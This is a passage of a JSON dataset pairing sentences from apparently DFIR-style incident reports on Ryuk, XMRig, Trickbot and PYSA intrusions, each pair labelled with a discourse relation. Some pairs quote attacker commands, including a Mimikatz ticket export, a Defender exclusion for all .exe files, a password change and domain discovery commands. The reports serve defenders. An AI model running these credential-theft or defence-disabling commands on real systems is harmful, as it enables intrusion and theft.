        "S2": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1",
        "S2": "The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment.",
        "S2": "This includes things like disk size, connectivity, antivirus software, and backup software.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This includes things like disk size, connectivity, antivirus software, and backup software.",
        "S2": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "relation": "MISC"
    },
    {
        "S1": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "S2": "This script and files are available @ https://thedfirreport.com/services/",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script and files are available @ https://thedfirreport.com/services/",
        "S2": "The threat actors deployed several types of lateral movements over the course of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors deployed several types of lateral movements over the course of the intrusion.",
        "S2": "The first observed method was the use of a remote service using PowerShell which injected into winlogon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first observed method was the use of a remote service using PowerShell which injected into winlogon.",
        "S2": "The threat actors also leveraged SMB to send Cobalt Strike Beacon executables to $ADMIN shares and again execute them on the remote systems via a service.",
        "relation": "LIST"
    },
    {
        "S1": "The threat actors also leveraged SMB to send Cobalt Strike Beacon executables to $ADMIN shares and again execute them on the remote systems via a service.",
        "S2": "SMB Beacon as its called in Cobalt Strike.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SMB Beacon as its called in Cobalt Strike.",
        "S2": "Pass the Hash was also used by the attackers while pivoting through the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Pass the Hash was also used by the attackers while pivoting through the environment.",
        "S2": "RDP was also leveraged by the attacker via their Cobalt Strike Beacons.",
        "relation": "LIST"
    },
    {
        "S1": "RDP was also leveraged by the attacker via their Cobalt Strike Beacons.",
        "S2": "Communication over DNS to .bazar domains.",
        "relation": "MISC"
    },
    {
        "S1": "A threat actor recently brute forced a local administrator password using RDP and then dumped credentials using Mimikatz.",
        "S2": "They not only dumped LogonPasswords but they also exported all Kerberos tickets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They not only dumped LogonPasswords but they also exported all Kerberos tickets.",
        "S2": "The threat actor used Advanced IP Scanner to scan the environment before RDPing into multiple systems, including a Domain Controller.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor used Advanced IP Scanner to scan the environment before RDPing into multiple systems, including a Domain Controller.",
        "S2": "After an hour of moving around the environment, they deployed XMRig on the initial compromised system before logging off.",
        "relation": "NEXT"
    },
    {
        "S1": "After an hour of moving around the environment, they deployed XMRig on the initial compromised system before logging off.",
        "S2": "The threat actor was active on the network for about 2 hours in total.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor was active on the network for about 2 hours in total.",
        "S2": "The threat actor logged in using RDP from an IP (92.118.13[.]103) that hadn\u2019t attempted any previous logins.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor logged in using RDP from an IP (92.118.13[.]103) that hadn\u2019t attempted any previous logins.",
        "S2": "The account was created the previous day using a source IP of 54.38.67[.]132, which had been trying to brute force a local admin password.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The account was created the previous day using a source IP of 54.38.67[.]132, which had been trying to brute force a local admin password.",
        "S2": "The threat actor used a workstation named winstation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor used a workstation named winstation.",
        "S2": "During the intrusion, the threat actors also used 5.122.15[.]138 to login to one of the systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the intrusion, the threat actors also used 5.122.15[.]138 to login to one of the systems.",
        "S2": "The threat actor copied svshost.exe to C:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor copied svshost.exe to C:",
        "S2": "az and then executed it",
        "relation": "NEXT"
    },
    {
        "S1": "az and then executed it",
        "S2": ".",
        "relation": "MISC"
    },
    {
        "S1": ".",
        "S2": "This PE creates \u201cXMRig CPU mine.exe\u201d and HideAll.bat in C:\\Windows\\PolicyDefinitions and then executes both of them.",
        "relation": "MISC"
    },
    {
        "S1": "This PE creates \u201cXMRig CPU mine.exe\u201d and HideAll.bat in C:\\Windows\\PolicyDefinitions and then executes both of them.",
        "S2": "The PE file that installs XMRig (svshost.exe) also has a script (HideAll.bat) imbedded in it, which is called at runtime.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The PE file that installs XMRig (svshost.exe) also has a script (HideAll.bat) imbedded in it, which is called at runtime.",
        "S2": "This is the contents of that batch file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is the contents of that batch file.",
        "S2": "This script is copied to C:\\Windows\\PolicyDefitions\\ and run, which causes the files specified to be hidden.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script is copied to C:\\Windows\\PolicyDefitions\\ and run, which causes the files specified to be hidden.",
        "S2": "Before the threat actor disconnected, they changed the user password.",
        "relation": "MISC"
    },
    {
        "S1": "Before the threat actor disconnected, they changed the user password.",
        "S2": "net user %USERNAME% ehs.123",
        "relation": "ELABORATION"
    },
    {
        "S1": "net user %USERNAME% ehs.123",
        "S2": "Mimikatz was used to dump credentials from memory, as well as, export Kerberos tickets using the following command:",
        "relation": "MISC"
    },
    {
        "S1": "Mimikatz was used to dump credentials from memory, as well as, export Kerberos tickets using the following command:",
        "S2": "The threat actors used a vbs script named launch to execute mimikatz.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors used a vbs script named launch to execute mimikatz.",
        "S2": "This is the content of launch.vbs",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is the content of launch.vbs",
        "S2": "Since the log parameter was used, the output was saved to mimikatz.log",
        "relation": "MISC"
    },
    {
        "S1": "Since the log parameter was used, the output was saved to mimikatz.log",
        "S2": "The Kerberos tickets were saved to disk, due to the threat actor using sekurlsa::tickets /export.",
        "relation": "MISC"
    },
    {
        "S1": "The Kerberos tickets were saved to disk, due to the threat actor using sekurlsa::tickets /export.",
        "S2": "Advanced IP Scanner was used to scan the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Advanced IP Scanner was used to scan the environment.",
        "S2": "Task manager was opened multiple times.",
        "relation": "MISC"
    },
    {
        "S1": "Task manager was opened multiple times.",
        "S2": "Possibly looking at logged in users and/or processes.",
        "relation": "NEXT"
    },
    {
        "S1": "Possibly looking at logged in users and/or processes.",
        "S2": "Net Accounts was used to review user policies.",
        "relation": "MISC"
    },
    {
        "S1": "Net Accounts was used to review user policies.",
        "S2": "net accounts",
        "relation": "ELABORATION"
    },
    {
        "S1": "net accounts",
        "S2": "masscan and masscan gui were dropped but were not executed.",
        "relation": "MISC"
    },
    {
        "S1": "masscan and masscan gui were dropped but were not executed.",
        "S2": "RDP was used to move laterally to multiple machines in the environment, which included domain controllers, backup machines, etc.",
        "relation": "MISC"
    },
    {
        "S1": "RDP was used to move laterally to multiple machines in the environment, which included domain controllers, backup machines, etc.",
        "S2": "RDP was used to access the environment, as well as move within the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "RDP was used to access the environment, as well as move within the environment.",
        "S2": "XMRig was running on the system, using some CPU but not enough to cause any issues.",
        "relation": "NEXT"
    },
    {
        "S1": "XMRig was running on the system, using some CPU but not enough to cause any issues.",
        "S2": "We tend to block mining endpoints, which may have lessened the impact of this intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We tend to block mining endpoints, which may have lessened the impact of this intrusion.",
        "S2": "XMRig made connection attempts to 104.140.201[.]42 & 104.142.244[.]186.",
        "relation": "MISC"
    },
    {
        "S1": "XMRig made connection attempts to 104.140.201[.]42 & 104.142.244[.]186.",
        "S2": "The threat actors have been using the associated Monero wallet for 738+ days and have netted around $5,159.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors have been using the associated Monero wallet for 738+ days and have netted around $5,159.",
        "S2": "Was the threat actors\u2019 mission to mine Monero?",
        "relation": "ELABORATION"
    },
    {
        "S1": "Was the threat actors\u2019 mission to mine Monero?",
        "S2": "Or was this a recon mission?",
        "relation": "ELABORATION"
    },
    {
        "S1": "Or was this a recon mission?",
        "S2": "Possibly both?",
        "relation": "ELABORATION"
    },
    {
        "S1": "Possibly both?",
        "S2": "Enjoy our report?",
        "relation": "MISC"
    },
    {
        "S1": "Enjoy our report?",
        "S2": "Please consider donating $1 or more to the project using Patreon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Please consider donating $1 or more to the project using Patreon.",
        "S2": "Thank you for your support!",
        "relation": "ELABORATION"
    },
    {
        "S1": "Thank you for your support!",
        "S2": "We also have pcaps, files, and Kape packages available here.",
        "relation": "MISC"
    },
    {
        "S1": "We also have pcaps, files, and Kape packages available here.",
        "S2": "No memory captures are available for this case.",
        "relation": "MISC"
    },
    {
        "S1": "The Trickbot threat actors used Cobalt Strike to pivot through-out the domain, dumping lsass and ntds.dit as they went.",
        "S2": "They used tools such as AdFind, Nltest, Net, Bloodhound, and PowerView to peruse the domain, looking for high privileged credentials to accomplish their mission.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They used tools such as AdFind, Nltest, Net, Bloodhound, and PowerView to peruse the domain, looking for high privileged credentials to accomplish their mission.",
        "S2": "They used PowerShell, SMB, and WMI to move laterally.",
        "relation": "NEXT"
    },
    {
        "S1": "They used PowerShell, SMB, and WMI to move laterally.",
        "S2": "After acquiring the necessary credentials, the threat actors used a technique called Overpass-the-hash to move to a backup server, before being kicked off the network.",
        "relation": "NEXT"
    },
    {
        "S1": "After acquiring the necessary credentials, the threat actors used a technique called Overpass-the-hash to move to a backup server, before being kicked off the network.",
        "S2": "We believe if this attack had been allowed to continue, it would have ended in domain wide ransomware, specifically Ryuk.",
        "relation": "NEXT"
    },
    {
        "S1": "We believe if this attack had been allowed to continue, it would have ended in domain wide ransomware, specifically Ryuk.",
        "S2": "The original delivery mechanism was not found, but likely to have been a malicious email based on previous known Trickbot campaigns.",
        "relation": "MISC"
    },
    {
        "S1": "The original delivery mechanism was not found, but likely to have been a malicious email based on previous known Trickbot campaigns.",
        "S2": "Trickbot was manually executed on a single endpoint.",
        "relation": "NEXT"
    },
    {
        "S1": "Trickbot was manually executed on a single endpoint.",
        "S2": "Source: Hatching Triage | Behavioral Report",
        "relation": "MISC"
    },
    {
        "S1": "Source: Hatching Triage | Behavioral Report",
        "S2": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
        "S2": "After executing on the infected endpoint, the Trickbot executable injected itself into the Window Error Reporting Manager (wermgr.exe).",
        "relation": "NEXT"
    },
    {
        "S1": "After executing on the infected endpoint, the Trickbot executable injected itself into the Window Error Reporting Manager (wermgr.exe).",
        "S2": "Subsequent Trickbot command and control traffic then originated from the injected wermgr.exe process going forward.",
        "relation": "NEXT"
    },
    {
        "S1": "Subsequent Trickbot command and control traffic then originated from the injected wermgr.exe process going forward.",
        "S2": "Using the YARA rule generated by Malpedia we were able to locate Cobalt Strike injections in the following processes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using the YARA rule generated by Malpedia we were able to locate Cobalt Strike injections in the following processes.",
        "S2": "The threat actors employed a couple different credential access techniques.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors employed a couple different credential access techniques.",
        "S2": "The first technique used was dumping passwords from lsass on the beachhead machine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first technique used was dumping passwords from lsass on the beachhead machine.",
        "S2": "After they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "After they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:",
        "S2": "The above command was executed from a batch file that was dropped and then executed using wmic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The above command was executed from a batch file that was dropped and then executed using wmic.",
        "S2": "This command, which is included in DPAT, dumps NTDS.dit to disk and has been used by Trickbot actors in the past.",
        "relation": "NEXT"
    },
    {
        "S1": "This command, which is included in DPAT, dumps NTDS.dit to disk and has been used by Trickbot actors in the past.",
        "S2": "The above technique has been around since at least 2014 @chriscampell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The above technique has been around since at least 2014 @chriscampell.",
        "S2": "The threat actors ran the AdFind utility for domain discovery.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors ran the AdFind utility for domain discovery.",
        "S2": "The following net commands were used by the threat actor.",
        "relation": "NEXT"
    },
    {
        "S1": "The following net commands were used by the threat actor.",
        "S2": "While on systems, we also saw them use the following commands.",
        "relation": "MISC"
    },
    {
        "S1": "While on systems, we also saw them use the following commands.",
        "S2": "The following Nltest commands were executed several times by the threat actors over the course of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The following Nltest commands were executed several times by the threat actors over the course of the intrusion.",
        "S2": "The ping command was then used to test connectivity to the domain controllers and other systems.",
        "relation": "NEXT"
    },
    {
        "S1": "The ping command was then used to test connectivity to the domain controllers and other systems.",
        "S2": "Bloodhound was ran for domain attack path enumeration.",
        "relation": "NEXT"
    },
    {
        "S1": "Bloodhound was ran for domain attack path enumeration.",
        "S2": "The threat actors utilized several lateral movement techniques.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors utilized several lateral movement techniques.",
        "S2": "The first of which was using a remote service to execute PowerShell from the registry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first of which was using a remote service to execute PowerShell from the registry.",
        "S2": "After decoding the above command a couple times and xoring you are left with the following shellcode, which appears to include a named pipe.",
        "relation": "NEXT"
    },
    {
        "S1": "After decoding the above command a couple times and xoring you are left with the following shellcode, which appears to include a named pipe.",
        "S2": "This CyberChef Recipe was used to decode the above PS command",
        "relation": "ELABORATION"
    },
    {
        "S1": "This CyberChef Recipe was used to decode the above PS command",
        "S2": "The next lateral movement method used is SMB transfer and exec of batch files.",
        "relation": "MISC"
    },
    {
        "S1": "The next lateral movement method used is SMB transfer and exec of batch files.",
        "S2": "This file was seen executed locally via cmd, and on remote systems using wmic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This file was seen executed locally via cmd, and on remote systems using wmic.",
        "S2": "SMB was also used to transfer Cobalt Strike Beacon executables to the ADMIN$ share on systems, which were then executed via a service.",
        "relation": "MISC"
    },
    {
        "S1": "SMB was also used to transfer Cobalt Strike Beacon executables to the ADMIN$ share on systems, which were then executed via a service.",
        "S2": "Additionally, we also witnessed the use of overpass-the-hash.",
        "relation": "MISC"
    },
    {
        "S1": "Additionally, we also witnessed the use of overpass-the-hash.",
        "S2": "Here we can see a 4624 event with seclogo as the logon process and logon type 9 which tells us some form of pass the hash occurred.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here we can see a 4624 event with seclogo as the logon process and logon type 9 which tells us some form of pass the hash occurred.",
        "S2": "Shortly after we see a couple Kerberos service ticket requests for that user.",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly after we see a couple Kerberos service ticket requests for that user.",
        "S2": "This alert fired a couple times based on network activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This alert fired a couple times based on network activity.",
        "S2": "Here\u2019s some helpful information when looking for PTH or OPTH from Stealthbits",
        "relation": "MISC"
    },
    {
        "S1": "Here\u2019s some helpful information when looking for PTH or OPTH from Stealthbits",
        "S2": "Cobalt Strike C2 #1:",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike C2 #1:",
        "S2": "Extracted Cobalt Strike Config:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Extracted Cobalt Strike Config:",
        "S2": "Cobalt Strike C2 #2:",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike C2 #2:",
        "S2": "Trickbot Mor1",
        "relation": "MISC"
    },
    {
        "S1": "Trickbot Mor1",
        "S2": "Based on the activity seen, we assess that the likely final actions would have been ransomware deployment across the domain environment.",
        "relation": "MISC"
    },
    {
        "S1": "Based on the activity seen, we assess that the likely final actions would have been ransomware deployment across the domain environment.",
        "S2": "Based on research from late last year by Kyle Ehmke, we can assess that the likely ransom deployment would have been Ryuk (Wizard Spider / UNC1878).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Based on research from late last year by Kyle Ehmke, we can assess that the likely ransom deployment would have been Ryuk (Wizard Spider / UNC1878).",
        "S2": "Enjoy our report?",
        "relation": "MISC"
    },
    {
        "S1": "Enjoy our report?",
        "S2": "Please consider donating $1 or more to the project using Patreon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Please consider donating $1 or more to the project using Patreon.",
        "S2": "Thank you for your support!",
        "relation": "ELABORATION"
    },
    {
        "S1": "Thank you for your support!",
        "S2": "We also have pcaps, files, and Kape packages available here.",
        "relation": "MISC"
    },
    {
        "S1": "We also have pcaps, files, and Kape packages available here.",
        "S2": "No memory captures are available for this case.",
        "relation": "MISC"
    },
    {
        "S1": "In this intrusion the entry was a Windows host with RDP exposed to the internet.",
        "S2": "The threat actors logged in with a valid account (Domain Administrator).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors logged in with a valid account (Domain Administrator).",
        "S2": "The login was from a Tor exit node and over the course of an 8 hour intrusion we saw them hand off 2 times, for a total of 3 different Tor exits being used to maintain RDP access to the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The login was from a Tor exit node and over the course of an 8 hour intrusion we saw them hand off 2 times, for a total of 3 different Tor exits being used to maintain RDP access to the environment.",
        "S2": "The account used to access the first beachhead host had enough privileges to immediately begin lateral movement to a domain controller just minutes after entry.",
        "relation": "NEXT"
    },
    {
        "S1": "The account used to access the first beachhead host had enough privileges to immediately begin lateral movement to a domain controller just minutes after entry.",
        "S2": "Network scanning begun on the domain controller followed closely by Empire.",
        "relation": "NEXT"
    },
    {
        "S1": "Network scanning begun on the domain controller followed closely by Empire.",
        "S2": "While the Empire C2 remained active during the whole intrusion, we saw little activity from it, more like a fallback channel should their RDP access fall off.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While the Empire C2 remained active during the whole intrusion, we saw little activity from it, more like a fallback channel should their RDP access fall off.",
        "S2": "As they started to move laterally to other systems, it was very obvious they were following a checklist playbook.",
        "relation": "MISC"
    },
    {
        "S1": "As they started to move laterally to other systems, it was very obvious they were following a checklist playbook.",
        "S2": "Each time they pivoted, they would check quser, and then dump lsass using Task Manager.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each time they pivoted, they would check quser, and then dump lsass using Task Manager.",
        "S2": "During the intrusion we saw the PYSA threat actors attempt to access credentials via the following techniques::",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusion we saw the PYSA threat actors attempt to access credentials via the following techniques::",
        "S2": "- Dump lsass with Taskmanager",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Dump lsass with Taskmanager",
        "S2": "- Dump lsass with Procdump",
        "relation": "LIST"
    },
    {
        "S1": "- Dump lsass with Procdump",
        "S2": "- Dump lsass with comsvcs.dll",
        "relation": "LIST"
    },
    {
        "S1": "- Dump lsass with comsvcs.dll",
        "S2": "- Dump credentials with Invoke-Mimikatz",
        "relation": "LIST"
    },
    {
        "S1": "- Dump credentials with Invoke-Mimikatz",
        "S2": "- Extract the shadow copy of the ntds.dit from the domain controller",
        "relation": "LIST"
    },
    {
        "S1": "- Extract the shadow copy of the ntds.dit from the domain controller",
        "S2": "- Extract and decode backup system credentials from a SQL database",
        "relation": "LIST"
    },
    {
        "S1": "- Extract and decode backup system credentials from a SQL database",
        "S2": "- Access LSA Secrets",
        "relation": "LIST"
    },
    {
        "S1": "- Access LSA Secrets",
        "S2": "Most lateral movement in the environment was via RDP with various legitimate user accounts, as well as PsExec to execute scripts throughout the environment for credential dumping and collection activity.",
        "relation": "MISC"
    },
    {
        "S1": "Most lateral movement in the environment was via RDP with various legitimate user accounts, as well as PsExec to execute scripts throughout the environment for credential dumping and collection activity.",
        "S2": "The threat actor disabled security tools throughout the intrusion by using Local Security Policy Editor and MpPreference to disable Defender.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor disabled security tools throughout the intrusion by using Local Security Policy Editor and MpPreference to disable Defender.",
        "S2": "PowerShell Remoting was also used to run the arp command on a few systems.",
        "relation": "MISC"
    },
    {
        "S1": "PowerShell Remoting was also used to run the arp command on a few systems.",
        "S2": "Besides using RDP and Empire the group also used the Offensive Security Tool (OST) Koadic, which bills itself as a post exploitation toolkit that can stay resident in memory using JScript or VBS via Windows Script Host to perform its execution.",
        "relation": "MISC"
    },
    {
        "S1": "Besides using RDP and Empire the group also used the Offensive Security Tool (OST) Koadic, which bills itself as a post exploitation toolkit that can stay resident in memory using JScript or VBS via Windows Script Host to perform its execution.",
        "S2": "Koadic was only utilized on a few key servers and one of those servers included a persistence mechanism using the default Koadic HTA scheduled task module.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Koadic was only utilized on a few key servers and one of those servers included a persistence mechanism using the default Koadic HTA scheduled task module.",
        "S2": "After around 7 hours post initial access, the threat actors began their final actions by RDPing into systems, dropping a PowerShell script and the ransomware executable.",
        "relation": "NEXT"
    },
    {
        "S1": "After around 7 hours post initial access, the threat actors began their final actions by RDPing into systems, dropping a PowerShell script and the ransomware executable.",
        "S2": "The PowerShell script killed various active processes and made sure RDP was open at the firewall and created what appears to be a potentially unique identifier for systems.",
        "relation": "NEXT"
    },
    {
        "S1": "The PowerShell script killed various active processes and made sure RDP was open at the firewall and created what appears to be a potentially unique identifier for systems.",
        "S2": "After that, the ransom would be run to encrypt the system.",
        "relation": "NEXT"
    },
    {
        "S1": "After that, the ransom would be run to encrypt the system.",
        "S2": "After the encryption was done we were able to confirm exfiltration occurring by receiving a callback from a canary document.",
        "relation": "NEXT"
    },
    {
        "S1": "After the encryption was done we were able to confirm exfiltration occurring by receiving a callback from a canary document.",
        "S2": "The threat actors asked for 5 BTC or around $88,000 USD which tells us these attackers most likely base their ransom demand on the information exfiltrated.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors asked for 5 BTC or around $88,000 USD which tells us these attackers most likely base their ransom demand on the information exfiltrated.",
        "S2": "Initial access for this actor was via exposed RDP services.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access for this actor was via exposed RDP services.",
        "S2": "Originally, the actor connected from 198.96.155.3, and then performed a kind of hand off over the course of the campaign, first to 23.129.64.190 and then finally 185.220.100.240.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Originally, the actor connected from 198.96.155.3, and then performed a kind of hand off over the course of the campaign, first to 23.129.64.190 and then finally 185.220.100.240.",
        "S2": "All 3 of these IP\u2019s",
        "relation": "ELABORATION"
    },
    {
        "S1": "All 3 of these IP\u2019s",
        "S2": "belong to the Tor network and function as exit nodes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "belong to the Tor network and function as exit nodes.",
        "S2": "The threat actors started off by using RDP but also relied on 2 different OSTs during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors started off by using RDP but also relied on 2 different OSTs during this intrusion.",
        "S2": "A few minutes after gaining access, they moved laterally to a domain controller and then executed a PowerShell launcher for Empire.",
        "relation": "NEXT"
    },
    {
        "S1": "A few minutes after gaining access, they moved laterally to a domain controller and then executed a PowerShell launcher for Empire.",
        "S2": "Later during the intrusion, the threat actors employed another OST named Koadic.",
        "relation": "NEXT"
    },
    {
        "S1": "Later during the intrusion, the threat actors employed another OST named Koadic.",
        "S2": "To execute Koadic, they employed a MSHTA launcher with javascript.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To execute Koadic, they employed a MSHTA launcher with javascript.",
        "S2": "From those two executions, various child processes were created to load stage 2 into memory.",
        "relation": "NEXT"
    },
    {
        "S1": "From those two executions, various child processes were created to load stage 2 into memory.",
        "S2": "Persistence was setup using Koadic to schedule a task to execute a HTA file located in the C:\\ProgramData directory at logon as system.",
        "relation": "NEXT"
    },
    {
        "S1": "Persistence was setup using Koadic to schedule a task to execute a HTA file located in the C:\\ProgramData directory at logon as system.",
        "S2": "This will initiate C2 back to the Koadic server.",
        "relation": "NEXT"
    },
    {
        "S1": "This will initiate C2 back to the Koadic server.",
        "S2": "The threat actors disabled Windows Defender using Local Group Policy Editor.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors disabled Windows Defender using Local Group Policy Editor.",
        "S2": "Later, they also ran a PowerShell script that would again disable Windows Defender, this time using MpPreference.",
        "relation": "NEXT"
    },
    {
        "S1": "Later, they also ran a PowerShell script that would again disable Windows Defender, this time using MpPreference.",
        "S2": "The script also targeted Malwarebytes, agents, Citrix, Exchange, Veeam, SQL and many other processes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The script also targeted Malwarebytes, agents, Citrix, Exchange, Veeam, SQL and many other processes.",
        "S2": "Event ID 5001 was created due to Defender AV Real-Time being disabled.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Event ID 5001 was created due to Defender AV Real-Time being disabled.",
        "S2": "A Defender exclusion was also added to exclude everything with .exe as the extension.",
        "relation": "MISC"
    },
    {
        "S1": "A Defender exclusion was also added to exclude everything with .exe as the extension.",
        "S2": "Add-MpPreference -ExclusionExtension \".exe\" Event ID 5007 Windows Defender Antivirus Configuration has changed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Add-MpPreference -ExclusionExtension \".exe\" Event ID 5007 Windows Defender Antivirus Configuration has changed.",
        "S2": "If this is an unexpected event you should review the settings as this may be the result of malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If this is an unexpected event you should review the settings as this may be the result of malware.",
        "S2": "Old value: New value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\.exe = 0x0",
        "relation": "MISC"
    },
    {
        "S1": "Old value: New value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\.exe = 0x0",
        "S2": "The threat actors displayed multiple techniques for gathering credentials during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors displayed multiple techniques for gathering credentials during this intrusion.",
        "S2": "Credentials were dumped manually via Task Manager as they RDPed into each system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Credentials were dumped manually via Task Manager as they RDPed into each system.",
        "S2": "While established on a domain controller the threat actors also created and accessed a shadow copy of the ntds.dit and most likely exfiltrated it via their Koadic C2 channel.",
        "relation": "MISC"
    },
    {
        "S1": "While established on a domain controller the threat actors also created and accessed a shadow copy of the ntds.dit and most likely exfiltrated it via their Koadic C2 channel.",
        "S2": "The threat actors also executed a PowerShell script across the environment using PsExec that took advantage of comsvcs.dll to dump the lsass process and then copy the dump back to their pivot position on a domain controller.",
        "relation": "LIST"
    },
    {
        "S1": "The threat actors also executed a PowerShell script across the environment using PsExec that took advantage of comsvcs.dll to dump the lsass process and then copy the dump back to their pivot position on a domain controller.",
        "S2": "The threat actors tried using the Sysinternals ProcDump method but the executable was not present on the endpoint.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors tried using the Sysinternals ProcDump method but the executable was not present on the endpoint.",
        "S2": "The threat actors were focused on the backup server for quite awhile as they dumped credentials from the 3rd party backup software repository.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were focused on the backup server for quite awhile as they dumped credentials from the 3rd party backup software repository.",
        "S2": "The first script pulls the hashes out of the database and the second decodes the password to plain text.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first script pulls the hashes out of the database and the second decodes the password to plain text.",
        "S2": "Both scripts were run via PowerShell ISE.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both scripts were run via PowerShell ISE.",
        "S2": "The threat actors also ran Invoke-Mimikatz from BC-Security on one of the domain controllers.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also ran Invoke-Mimikatz from BC-Security on one of the domain controllers.",
        "S2": "We also saw the threat actors save LSA Secrets to disk using the hashdump_sam module in Koadic which runs impacket.",
        "relation": "MISC"
    },
    {
        "S1": "We also saw the threat actors save LSA Secrets to disk using the hashdump_sam module in Koadic which runs impacket.",
        "S2": "Inveigh was run on a domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "Inveigh was run on a domain controller.",
        "S2": "The threat actors leveraged many built-in Windows tools for discovery including the following:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors leveraged many built-in Windows tools for discovery including the following:",
        "S2": "quser.exe whoami.exe /user net.exe group /domain net.exe group \"Domain Users\" /domain nltest.exe /dclist: arp -a",
        "relation": "ELABORATION"
    },
    {
        "S1": "quser.exe whoami.exe /user net.exe group /domain net.exe group \"Domain Users\" /domain nltest.exe /dclist: arp -a",
        "S2": "The arp command was run using PowerShell Remoting.",
        "relation": "MISC"
    },
    {
        "S1": "The arp command was run using PowerShell Remoting.",
        "S2": "They also reviewed a few admin tools while exploring the network including:",
        "relation": "MISC"
    },
    {
        "S1": "They also reviewed a few admin tools while exploring the network including:",
        "S2": "The threat actors also brought some tools of their own to aid in discovery tasks including Advanced Port Scanner and ADRecon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors also brought some tools of their own to aid in discovery tasks including Advanced Port Scanner and ADRecon.",
        "S2": "Here\u2019s the description of ADRecon.",
        "relation": "MISC"
    },
    {
        "S1": "Here\u2019s the description of ADRecon.",
        "S2": "Other local discovery was performed using PowerShell such as ps to list the running process on systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Other local discovery was performed using PowerShell such as ps to list the running process on systems.",
        "S2": "The first lateral movement occurred just 3 minutes after the initial access by the threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "The first lateral movement occurred just 3 minutes after the initial access by the threat actor.",
